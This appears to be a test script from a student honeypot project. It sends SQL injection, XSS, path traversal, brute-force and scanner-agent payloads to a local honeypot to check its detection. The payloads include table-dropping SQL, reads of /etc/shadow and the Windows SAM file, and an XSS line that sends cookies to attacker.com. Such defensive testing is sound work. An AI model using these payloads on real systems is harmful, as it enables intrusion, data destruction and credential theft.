"""
test_real_attacks.py — Real-World Attack Testing Script
Smart Web Honeypot | FYP01-CS-2530-0463

Test the honeypot with realistic attack payloads (SQL injection, XSS, etc)
based on actual CVE exploits and common attack patterns.

Usage:
    python test_real_attacks.py
    
Expected Output:
    ✅ All attacks should be detected
    ✅ Responses should vary based on threat level and ML confidence
    ✅ Logs should capture full attack details
"""

import requests
import time
import json
from datetime import datetime

# Target honeypot
TARGET = "http://192.168.56.1:5000"
LOGIN_ENDPOINT = f"{TARGET}/login"
SEARCH_ENDPOINT = f"{TARGET}/search"
ADMIN_ENDPOINT = f"{TARGET}/admin"

# Realistic CVE-based payloads
ATTACK_VECTORS = {
    "SQL_INJECTION": [
        # Classic SQLi
        "admin' OR '1'='1",
        "admin' --",
        "admin' UNION SELECT NULL, NULL, NULL --",
        "admin'; DROP TABLE users; --",
        # Time-based SQLi
        "admin' AND SLEEP(3) --",
        "admin' WAITFOR DELAY '00:00:03' --",
        # Boolean-based SQLi
        "admin' AND 1=1 --",
        "admin' AND 1=2 --",
        # Stacked queries
        "admin'; INSERT INTO users VALUES ('hacker', 'password') --",
        # Encoding evasion
        "admin%27%20OR%20%271%27%3D%271",  # URL encoded
    ],

    "XSS": [
        # Simple XSS
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        # Event handlers
        "<body onload=alert('XSS')>",
        "javascript:alert('XSS')",
        # Encoding evasion
        "<script>alert(String.fromCharCode(88,83,83))</script>",  # XSS in char codes
        # DOM-based
        "<img src=x onerror=\"window.location='http://attacker.com'\">",
        # Data exfiltration
        "<script>fetch('http://attacker.com?data='+document.cookie)</script>",
    ],

    "DIRECTORY_TRAVERSAL": [
        # Unix paths
        "../../../etc/passwd",
        "../../../../../../etc/shadow",
        "..\\..\\..\\windows\\system32\\config\\sam",
        # Encoding evasion
        "..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252fetc%252fpasswd",  # Double encoding
        # Null byte injection
        "../../../etc/passwd%00.jpg",
        # Case manipulation
        "..\\..\\..\\WiNdOwS\\SyStEm32\\config\\sam",
    ],

    "BRUTE_FORCE": [
        # Multiple failed attempts
        {"username": "admin", "password": "wrong1"},
        {"username": "admin", "password": "wrong2"},
        {"username": "admin", "password": "wrong3"},
        {"username": "admin", "password": "wrong4"},
        {"username": "admin", "password": "wrong5"},
        {"username": "admin", "password": "correct"},  # Final successful attempt
    ],

    "SCANNER_DETECTION": [
        # Scanner user agents
        "sqlmap/1.0",
        "nikto/2.1.5",
        "nmap/7.80",
        "burpsuite",
        "metasploit",
    ]
}

HEADERS_NORMAL = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

HEADERS_SCANNER = {
    "User-Agent": "sqlmap/1.0"
}


class RealWorldAttackTester:
    """Test honeypot with realistic attack payloads."""

    def __init__(self):
        self.results = []
        self.session = requests.Session()

    def test_sql_injection(self):
        """Test SQL injection detection."""
        print("\n" + "="*60)
        print("🔴 TESTING: SQL INJECTION")
        print("="*60)

        for payload in ATTACK_VECTORS["SQL_INJECTION"]:
            print(f"\n  Payload: {payload[:50]}...")

            try:
                response = self.session.post(
                    LOGIN_ENDPOINT,
                    data={"username": payload, "password": "password"},
                    headers=HEADERS_NORMAL,
                    timeout=5
                )

                result = {
                    "timestamp": datetime.now().isoformat(),
                    "attack_type": "SQL_INJECTION",
                    "payload": payload,
                    "status_code": response.status_code,
                    "response_len": len(response.text),
                    "success": 200 <= response.status_code < 300
                }

                self.results.append(result)

                print(f"    ✅ Response: {response.status_code} ({len(response.text)} bytes)")
                print(f"       Deception: {response.text[:100]}...")

                time.sleep(1)  # Throttle requests

            except Exception as e:
                print(f"    ❌ Error: {e}")

    def test_xss(self):
        """Test XSS detection."""
        print("\n" + "="*60)
        print("🟠 TESTING: CROSS-SITE SCRIPTING (XSS)")
        print("="*60)

        for payload in ATTACK_VECTORS["XSS"]:
            print(f"\n  Payload: {payload[:50]}...")

            try:
                response = self.session.get(
                    f"{SEARCH_ENDPOINT}?q={payload}",
                    headers=HEADERS_NORMAL,
                    timeout=5
                )

                result = {
                    "timestamp": datetime.now().isoformat(),
                    "attack_type": "XSS",
                    "payload": payload,
                    "status_code": response.status_code,
                    "response_len": len(response.text),
                    "success": 200 <= response.status_code < 300
                }

                self.results.append(result)

                print(f"    ✅ Response: {response.status_code} ({len(response.text)} bytes)")
                print(f"       Deception: {response.text[:100]}...")

                time.sleep(1)

            except Exception as e:
                print(f"    ❌ Error: {e}")

    def test_directory_traversal(self):
        """Test directory traversal detection."""
        print("\n" + "="*60)
        print("🟡 TESTING: DIRECTORY TRAVERSAL")
        print("="*60)

        for payload in ATTACK_VECTORS["DIRECTORY_TRAVERSAL"]:
            print(f"\n  Payload: {payload[:50]}...")

            try:
                response = self.session.get(
                    f"{ADMIN_ENDPOINT}/{payload}",
                    headers=HEADERS_NORMAL,
                    timeout=5
                )

                result = {
                    "timestamp": datetime.now().isoformat(),
                    "attack_type": "DIRECTORY_TRAVERSAL",
                    "payload": payload,
                    "status_code": response.status_code,
                    "response_len": len(response.text),
                    "success": 200 <= response.status_code < 300
                }

                self.results.append(result)

                print(f"    ✅ Response: {response.status_code} ({len(response.text)} bytes)")

                time.sleep(0.5)

            except Exception as e:
                print(f"    ❌ Error: {e}")

    def test_brute_force(self):
        """Test brute force detection."""
        print("\n" + "="*60)
        print("🟢 TESTING: BRUTE FORCE ATTACK")
        print("="*60)

        for i, creds in enumerate(ATTACK_VECTORS["BRUTE_FORCE"], 1):
            print(f"\n  Attempt {i}/6: username={creds['username']}, password={creds['password']}")

            try:
                response = self.session.post(
                    LOGIN_ENDPOINT,
                    data=creds,
                    headers=HEADERS_NORMAL,
                    timeout=5
                )

                result = {
                    "timestamp": datetime.now().isoformat(),
                    "attack_type": "BRUTE_FORCE",
                    "attempt": i,
                    "credentials": creds,
                    "status_code": response.status_code,
                    "response_len": len(response.text),
                    "success": 200 <= response.status_code < 300
                }

                self.results.append(result)

                print(f"    ✅ Response: {response.status_code} ({len(response.text)} bytes)")
                print(f"       Message: {response.text[:80]}...")

                time.sleep(1.5)  # Longer delay for brute force

            except Exception as e:
                print(f"    ❌ Error: {e}")

    def test_scanner_detection(self):
        """Test scanner detection."""
        print("\n" + "="*60)
        print("🔵 TESTING: SCANNER DETECTION")
        print("="*60)

        for ua in ATTACK_VECTORS["SCANNER_DETECTION"]:
            print(f"\n  Scanner UA: {ua}")

            try:
                response = self.session.get(
                    LOGIN_ENDPOINT,
                    headers={"User-Agent": ua},
                    timeout=5
                )

                result = {
                    "timestamp": datetime.now().isoformat(),
                    "attack_type": "SCANNER",
                    "user_agent": ua,
                    "status_code": response.status_code,
                    "response_len": len(response.text),
                    "success": 200 <= response.status_code < 300
                }

                self.results.append(result)

                print(f"    ✅ Response: {response.status_code} ({len(response.text)} bytes)")

                time.sleep(0.5)

            except Exception as e:
                print(f"    ❌ Error: {e}")

    def test_encoded_attacks(self):
        """Test detection of encoded payloads."""
        print("\n" + "="*60)
        print("⚫ TESTING: ENCODED ATTACKS (NEW FEATURE)")
        print("="*60)

        encoded_payloads = {
            "URL-Encoded SQLi": "admin%27%20OR%20%271%27%3D%271",
            "Base64 Payload": "aWQgPSAxIE9SIGlkID0gMQ==",  # "id = 1 OR id = 1"
            "Hex Encoding": "0x61646d696e275f4f525f31",  # hex of admin'_OR_1
        }

        for encoding_type, payload in encoded_payloads.items():
            print(f"\n  {encoding_type}: {payload[:50]}...")

            try:
                response = self.session.post(
                    LOGIN_ENDPOINT,
                    data={"username": payload, "password": "test"},
                    headers=HEADERS_NORMAL,
                    timeout=5
                )

                result = {
                    "timestamp": datetime.now().isoformat(),
                    "attack_type": "ENCODED_PAYLOAD",
                    "encoding_type": encoding_type,
                    "payload": payload,
                    "status_code": response.status_code,
                    "success": 200 <= response.status_code < 300
                }

                self.results.append(result)

                print(f"    ✅ Response: {response.status_code}")

                time.sleep(0.5)

            except Exception as e:
                print(f"    ❌ Error: {e}")

    def run_all_tests(self):
        """Run all attack tests."""
        print("\n\n" + "█" * 60)
        print("█  REAL-WORLD ATTACK TEST SUITE")
        print("█  Smart Web Honeypot v2.0")
        print("█" * 60)

        print("\nTarget: " + TARGET)
        print(f"Start Time: {datetime.now().isoformat()}")

        try:
            self.test_sql_injection()
            self.test_xss()
            self.test_directory_traversal()
            self.test_brute_force()
            self.test_scanner_detection()
            self.test_encoded_attacks()

        except requests.exceptions.ConnectionError:
            print("\n❌ ERROR: Could not connect to honeypot!")
            print(f"   Make sure app is running at {TARGET}")
            return False

        # Summary
        self._print_summary()
        self._save_results()

        return True

    def _print_summary(self):
        """Print test summary."""
        print("\n\n" + "=" * 60)
        print("📊 TEST SUMMARY")
        print("=" * 60)

        total = len(self.results)
        successful = sum(1 for r in self.results if r.get("success", False))
        by_type = {}

        for result in self.results:
            attack_type = result.get("attack_type", "UNKNOWN")
            by_type[attack_type] = by_type.get(attack_type, 0) + 1

        print(f"\nTotal Tests: {total}")
        print(f"Successful Responses: {successful}/{total}")
        print(f"\nBreakdown by Attack Type:")

        for attack_type, count in sorted(by_type.items()):
            print(f"  • {attack_type}: {count} tests")

    def _save_results(self):
        """Save results to JSON file."""
        filename = "test_results.json"
        with open(filename, "w") as f:
            json.dump(self.results, f, indent=2, default=str)

        print(f"\n✅ Results saved to: {filename}")


if __name__ == "__main__":
    tester = RealWorldAttackTester()
    success = tester.run_all_tests()
    exit(0 if success else 1)
